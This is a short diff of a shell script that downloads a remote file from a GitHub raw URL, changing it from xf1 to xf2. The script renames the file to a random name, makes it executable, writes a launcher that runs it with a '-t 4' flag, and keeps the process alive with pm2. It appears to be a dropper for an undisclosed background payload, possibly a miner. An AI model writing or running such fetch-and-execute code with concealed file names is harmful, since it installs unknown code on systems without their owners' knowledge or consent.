@@ -22,9 +22,9 @@ chmod +x $NEW_SH
 npm install -g pm2
 pm2 start $NEW_SH
 
-wget https://raw.githubusercontent.com/hosseinxdns4/fictional-bassoon/main/xf1
+wget https://raw.githubusercontent.com/hosseinxdns4/fictional-bassoon/main/xf2
 NEW_PY=$(random_name).py
-mv xf1 $NEW_PY
+mv xf2 $NEW_PY
 chmod +x $NEW_PY
 echo "./$NEW_PY -t 4" > bsh.sh
 chmod +x bsh.sh
